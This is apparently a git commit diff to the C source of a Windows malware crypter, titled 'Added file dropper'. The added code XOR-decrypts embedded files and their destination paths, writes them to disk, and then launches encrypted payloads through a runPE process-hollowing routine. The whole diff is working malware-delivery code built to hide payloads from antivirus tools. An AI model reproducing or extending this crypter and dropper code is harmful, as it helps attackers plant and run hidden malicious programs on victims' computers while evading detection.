1c602470000a8442504291be2454c3e783e56b8d
tacticaljmp <31922031+tacticaljmp@users.noreply.github.com>
2017-12-14 14:56:01 +0100

    Added file dropper

--- crypter.c
+++ crypter.c
@@ -1,14 +1,40 @@
 #include <windows.h>
 #include <stdio.h>
+#include <unistd.h>
 #include "runPE.h"
 #include "payloads.h"
 
-
 int main() {
 	TCHAR szFilePath[1024];
+	FILE *currentDropfile;
 	
 	// Retrieve path to current module
-	GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
+	GetModuleFileNameA(0, LPSTR(szFilePath), 1024);	
+	
+	// Iterate dropfiles
+	for(int i=0; i < dropfileCount; i++) {		
+		// Decrypt dropfile before dropping
+		for(int j=0; j < dropfileSizes[i]; j++) {
+			dropfiles[i][j] = dropfiles[i][j] ^ dropfileKeys[i];
+		}
+		
+		// Decrypt the dropfile destination before dropping
+		for(int j=0; j < dropfileDestinationSizes[i]; j++) {
+			dropfileDestinations[i][j] = dropfileDestinations[i][j] ^ dropfileKeys[i];
+		}				
+		
+		// Drop file on destination
+		printf("Attempting to drop file %d, file size is %ld, destination is '%s'\n", i, dropfileSizes[i], (char *) dropfileDestinations[i]);				
+		if(access((char *) dropfileDestinations[i], F_OK) == 0) {
+			printf("Desired file already exists. Skip dropping.\n");
+		} else {
+			currentDropfile = fopen((char *) dropfileDestinations[i], "wb");
+			if(fwrite(dropfiles[i], dropfileSizes[i], 1, currentDropfile)) {
+				printf("Success.\n");
+			}	
+			fclose(currentDropfile);				
+		}				
+	}	
 	
 	// Iterate payloads
 	for(int i=0; i < payloadCount; i++) {	
@@ -26,6 +52,6 @@ int main() {
 		printf("\n Spawning payload %d, command line is '%s'\n", i, (char *) commandLines[i]);		
 		newRunPE(LPSTR(szFilePath), payloads[i], LPTSTR(commandLines[i]));			
 	}
-		
+				
 	return 0;
 }	
